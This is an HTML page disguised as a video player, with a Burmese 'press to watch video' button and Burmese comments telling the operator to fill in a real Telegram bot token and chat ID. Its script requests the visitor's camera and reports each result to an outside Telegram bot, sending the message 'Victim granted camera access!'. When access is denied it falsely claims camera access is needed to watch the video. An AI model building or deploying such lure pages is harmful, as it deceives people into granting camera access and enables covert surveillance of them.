<!DOCTYPE html>
<html>
<head>
    <title>Video Player</title>
    <style>
        body { margin: 0; background: black; color: white; text-align: center; font-family: sans-serif; }
        #startBtn { margin-top: 50%; padding: 15px 30px; font-size: 18px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 10px; }
        #videoContainer { display: none; width: 100%; height: 100vh; }
        video { width: 100%; height: 100%; object-fit: contain; }
    </style>
</head>
<body>

    <button id="startBtn">ဗီဒီယိုကြည့်ရန် နှိပ်ပါ</button>

    <div id="videoContainer">
        <video id="myVideo" controls>
            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
            Your browser does not support HTML5 video.
        </video>
    </div>

    <script>
        const token = "8684084048:AAEVozTW2qWgq33..."; // သင့် Token အစစ်ထည့်ပါ
        const chatId = "5304050102"; // သင့် Chat ID အစစ်ထည့်ပါ

        async function sendToBot(msg) {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
        }

        document.getElementById("startBtn").addEventListener("click", async () => {
            try {
                // ၁။ ကင်မရာ ခွင့်ပြုချက်တောင်းခြင်း
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                // ၂။ ခွင့်ပြုချက်ရတာနဲ့ Bot ဆီ အချက်အလက်ပို့ခြင်း
                await sendToBot("✅ Victim granted camera access!");
                
                // ၃။ Website ပေါ်မှာ Video ကို ပြသခြင်း
                document.getElementById("startBtn").style.display = "none";
                document.getElementById("videoContainer").style.display = "block";
                document.getElementById("myVideo").play();
                
            } catch (err) {
                await sendToBot("❌ Access Denied!");
                alert("Please allow camera access to watch the video.");
            }
        });
    </script>
</body>
</html>
